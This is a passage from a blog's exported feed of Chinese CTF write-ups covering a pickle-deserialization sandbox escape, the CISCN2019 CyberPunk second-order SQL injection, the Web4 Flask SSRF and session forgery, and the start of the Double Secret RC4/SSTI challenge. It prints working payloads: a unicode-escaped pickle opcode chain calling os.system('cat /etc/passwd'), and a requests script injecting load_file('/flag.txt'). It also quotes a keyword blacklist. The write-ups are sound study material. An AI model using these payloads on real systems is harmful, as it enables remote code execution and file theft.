    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span> <span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'commands'</span><span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            <span class="token keyword">return</span> None

    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>可以看到使用restricted_loads禁止出现这些字样出现在opcode里，还专门encode了一下，encode参数留空默认为utf8，可能是因为输入是byte类型，所以encode一下才能比较？<br>重写find_class函数，find_class在c,i这几个opcode引入对象时会被调用，限制模块的前三个字符一定是app，且导入的类或方法中不能存在双下划线</p>
<p>说实话，以前好像没见过在find_class之外还整一个restricted_loads来进行额外限制的<br>restricted_loads的限制可以用opcode V来绕过，V表示压入一个Unicode的字符串，这样子就能完全的绕过black_list但又能被解析</p>
<p>主要还是要看怎么绕过find_class，第一步用c来获取对象的时候，还是不能用Unicode的，所以还是要看看app里面都有什么，简单浏览了一下import进来的东西，有两个比较有意思的东西</p>
<h4 id="getattr-amp-amp-sys-modules"><a href="#getattr-amp-amp-sys-modules" class="headerlink" title="getattr&amp;&amp;sys.modules"></a>getattr&amp;&amp;sys.modules</h4><p>getattr感觉不太能被禁用，因为本身就是find_class函数调用的部分，且也属于python builtin的内置函数<br>利用getattr绕过find_class应该是pickle中经常出现的操作，在find_class中获取一个getattr，再通过getattr获取实际想获取的方法模块之类的</p>
<p>sys.modules以前没学过，现在学习了呜呜</p>
<blockquote>
<p>sys 模块包含了系统级的信息，像正在运行的 Python 的版本 (sys.version 或 sys.version_info)，和系统级选项，像最大允许递归的深度 (sys.getrecursionlimit() 和 sys.setrecursionlimit())。<br>sys.modules 是一个字典，它包含了从 Python 开始运行起，被导入的所有模块。键字就是模块名，键值就是模块对象。<strong>请注意除了你的程序导入的模块外还有其它模块。</strong>Python 在启动时预先装入了一些模块，如果你在一个 Python IDE 环境下，sys.modules 包含了你在 IDE 中运行的所有程序所导入的所有模块。</p>
</blockquote>
<p>本地试了一下，即使没有显式导入os，但sys.modules仍能获取到os，想了半天为什么会自动导入os，后来rmb神仙告诉我原来是导入的其他库导入了os，太强了</p>
<h3 id="payload详解"><a href="#payload详解" class="headerlink" title="payload详解"></a>payload详解</h3><p>编写payload，我太弱了，这里是直接抄的rmb的payload</p>
<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token triple-quoted-string string">'''capp
getattr
p1
(capp
modules
V\\u0067\\u0065\\u0074    # get
tR(V\\u006f\\u0073        # os
tRp2
g1
(g2
V\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d        # system
tR(V\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064        # payload
tR.'''</span>
</code></pre>
<p>pickle的存储空间分为栈和memo，memo是一个队列，p和g就是把栈上数据put到memo，或者把memo中的数据get到栈上<br>python Unicode解码直接用str.decode(“unicode-escape”)</p>
<p>python源码里关于opcode的注释过于抽象。。。还是找的文章看的opcode具体操作</p>
<pre><code>c 向栈顶压入app.getattr
p1 将app.getattr放到memo上去，位置为1
( 压入一个MARK
c 压入app.modules
V 压入字符串get
t 将MARK之上的数据弹出，作为一个元组压入，即此时栈内数据为 app.getattr (app.modules, &quot;get&quot;)
R 弹出栈顶两个元素，栈顶下的元素为可执行对象，栈顶为参数（栈顶必须为元组），执行该函数，将结果压回栈中 即执行getattr(modules, &quot;get&quot;)，返回一个modules.get函数对象 此时栈中元素为getattr modules.get
(V 同上，压入MARK和字符串os
tR 同上，调用modules.get(&quot;os&quot;)，将os对象压回栈中 栈中数据为 getattr os
p2 将os对象放入memo，位置为2
g1 把memo位置1的元素getattr压入栈
(g2 压入MARK，把memo位置2的元素os压入栈
V 压入字符串system
tR 同上，调用getattr(os,&#39;system&#39;)，获取到函数os.system
(V 压入MARK和payload
tR 将payload弹出，调用os.system(payload)
. 结束
</code></pre>
<h3 id="opcode详解文章"><a href="#opcode详解文章" class="headerlink" title="opcode详解文章"></a>opcode详解文章</h3><p><a href="https://xz.aliyun.com/t/7436#toc-12">https://xz.aliyun.com/t/7436#toc-12</a><br><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
<p>太感谢rmb神仙手把手教我了，三天高强度学习感觉学到好多东西呜呜</p>
<h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p><a href="https://c1sec.hfut.edu.cn/writeup/C1CTF_2020.html">https://c1sec.hfut.edu.cn/writeup/C1CTF_2020.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
        <tag>pickle</tag>
        <tag>AES</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <url>/%5BCISCN2019%20Day1%20Web5%5DCyberPunk.html</url>
    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p>buu上的老题，文件包含加二次注入，还是个update注入，幸好没过滤不然做不出来了</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>index.php中有注释提示?file参数，猜就是文件包含，直接读源码，翻一下一共能找到index.php，config.php,change.php,delete.php,search.php,confirm.php六个文件，全部用filter读下来，很简单对吧</p>
<h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p>index.php里面虽然给了一个文件包含，不过有一定的限制，还设置了openbasedir，并且剩下的代码都是数据库相关操作，懒得考虑文件包含还能怎么利用了，看数据库操作<br>change.php,delete.php,search.php,confirm.php四个文件分别完成修改删除查找和插入四个功能，其中每个操作都对用户名和手机号做了超级过滤<code>$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code>，有这样子的正则限制，感觉是什么也做不了了，但是address项却未做任何过滤，可以考虑通过address进行注入<br>在change.php中发现address被拿进去用了，虽然confirm.php中也使用了address，但是用的SQL预处理，无法注入，而change.php中是将已入库的数据又拿出来用，显然构成了二次注入</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>old_address的值完全可控且不受限制，而紧随其后的还有一个$db-&gt;error的输出，可以使用报错注入来获取数据，报错注入有一个长度限制，所以这里我使用另一种方法<br>由于address可被查询，可以闭合一下引号，再次对address进行赋值，这样子就可以把查询结果回显出来<br>payload如下<br><code>payload = &quot;&#39;,\</code>address`&#x3D;{} where user_name&#x3D;’z33’ – “.format(“(select * from(select load_file(‘&#x2F;flag.txt’))a)”)&#96;<br>在update语句中使用select的时候要额外套一层select然后还要给内层select起一个别名（原理没深究过但的确是这样的）<br>无过滤语句以此payload可以为所欲为了</p>
<p>因为一次攻击需要访问三个界面太麻烦，写了个垃圾脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://2e1c4b3c-565d-423f-90d7-ac12827e9518.node3.buuoj.cn/"</span>
phone <span class="token operator">=</span> <span class="token string">"28"</span>
payload <span class="token operator">=</span> <span class="token string">"',`address`={} where user_name='z33' -- "</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">"(select * from(select load_file('/flag.txt'))a)"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"user_name"</span><span class="token punctuation">:</span> <span class="token string">"z33"</span><span class="token punctuation">,</span> <span class="token string">"phone"</span><span class="token punctuation">:</span> phone<span class="token punctuation">,</span> <span class="token string">"address"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"confirm.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"user_name"</span><span class="token punctuation">:</span> <span class="token string">"z33"</span><span class="token punctuation">,</span> <span class="token string">"phone"</span><span class="token punctuation">:</span> phone<span class="token punctuation">,</span> <span class="token string">"address"</span><span class="token punctuation">:</span> <span class="token string">"111"</span><span class="token punctuation">}</span>
res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"change.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(res2.text)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"user_name"</span><span class="token punctuation">:</span> <span class="token string">"z33"</span><span class="token punctuation">,</span> <span class="token string">"phone"</span><span class="token punctuation">:</span> phone<span class="token punctuation">}</span>
res3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"search.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>可以看出来攻击过程是先提交数据，然后在change中将payload从库中取出完成修改，最后去search.php查询得到数据，phone每次提交改一下，不然新的数据插入不进去</p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>我其实不知道flag在哪，一开始看是SQL注入题，以为是暴库，然后先把默认的database翻了一遍，锤子没找到，然后去翻全部库，翻到两个非系统库，把两个库翻了个底朝天，也锤子没翻到，心态爆炸，看wp都是直接去读根目录的flag.txt？？？那我只能猜测可能是比赛告诉了flag位置？还是有什么我没发现的点可以获取flag？</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2019 华东南赛区]Web4</title>
    <url>/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4.html</url>
    <content><![CDATA[<h1 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h1><p>国赛国赛，复现复现</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>打开界面顺着给的链接走，会进read路由并且获取参数url&#x3D;<a href="https://www.baidu.com/">https://www.baidu.com</a><br>可以猜出来打一个ssrf，不过具体怎么打倒是没有思路，不过首先还是先用file协议读一下文件吧，然后输入file就直接回显WAF，果然没有这么简单啊</p>
<p>根据路由类型再访问一下index.php之类的路径，发现不存在index.php文件，大概可以猜出来是个python题或者js题之类的，不过还是不知道咋搞啊</p>
<p>看wp得知在flask框架下可以用一个名为的local_file协议，使用方法和file:&#x2F;&#x2F;协议没什么区别，读一下&#x2F;etc&#x2F;passwd发现能用，确定框架flask，python题。读一下常见路径，&#x2F;app&#x2F;app.py，获得源码</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding:utf-8</span>
<span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www-data'</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World! &lt;a href="/read?url=https://baidu.com">Read somethings&lt;/a>'</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'^file.*'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        n <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        <span class="token keyword">if</span> m <span class="token operator">or</span> n<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'No Hack'</span>
        res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
        <span class="token keyword">print</span> str<span class="token punctuation">(</span>ex<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'no response'</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session <span class="token operator">and</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'fuck'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Access denied'</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
        debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
        host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span>
    <span class="token punctuation">)</span>
</code></pre>
<p>从<code>print str(ex)</code>这句可以看出来是python2啊，然后过滤也就过滤了^file，所以local_file就能用，剩下的就是一个session的伪造，去flag路由拿flag了</p>
<p>好久没做过flask相关题目，都忘了flask的session是啥情况了，好像用的就是jwt，所以数据部分直接公开，需要用密钥加密一下签名部分，这里的secret_key是由种子产生的，而种子却是一个固定值uuid.getnode()，专门查了一下是个什么东西</p>
<blockquote>
<p>__Get the hardware address as a 48-bit positive integer. __The first time this runs, it may launch a separate program, which could be quite slow. If all attempts to obtain the hardware address fail, we choose a random 48-bit number with the multicast bit (least significant bit of the first octet) set to 1 as recommended in RFC 4122. __“Hardware address” means the MAC address of a network interface. __</p>
</blockquote>
<p>就是MAC地址嘛<br>读这个文件获得MAC地址&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到的MAC地址就按十六进制填进去生成key就可以了，不过要使用python2的环境，python2和python3的随机数是不一样的，这里从之前语法可以看到是Python2语法</p>
<p>可以先解密一下现在的session，然后把username改一下再加密，用那个cookie访问flag路由获取flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>flask</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2019 华东南赛区]Double Secret</title>
    <url>/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret.html</url>
    <content><![CDATA[<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p>国赛国赛，考的一个没听说过的RC4加密算法，只要能把加密算法做出来就是很简单的题目了</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>打开题啥也没有抓包啥也没有就一句Welcome To Find Secret，直接猜get提交一个secret或者路由secret好吧（我是不是也开始成为赛棍了）<br>路由secret有效，给一句Tell me your secret.I will encrypt it so others can’t see，在get提交一个secret，给出了加密的奇奇怪怪的字符串<br>测试测试，乱输的时候出现了报错，用的flask，直接展示了部分源码</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#解密</span>
    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
 
    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>
    <span class="token keyword">return</span> a
</code></pre>
<p>render_template_string，非常危险的函数好吧，safe应该是自己写的过滤，然后顺便检查了一下有没有带出flag，rc4百度了半天也没看见python的实现库，估计是出题人自己写的，HereIsTreasure应该是密钥，然后对输入的secret进行解密，然后用解密出来的结果进行ssti，顺便考虑一下绕过safe函数</p>
<p>算法研究实在太难，抄了大佬的脚本，事实上也可以去找在线加密网站，最后再自己base64解码再url编码也行</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse


<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">"init_key"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 返回加密后得内容</span>
    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    crypt <span class="token operator">=</span> str<span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> crypt


<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> s_box


<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment" spellcheck="true"># 密钥</span>
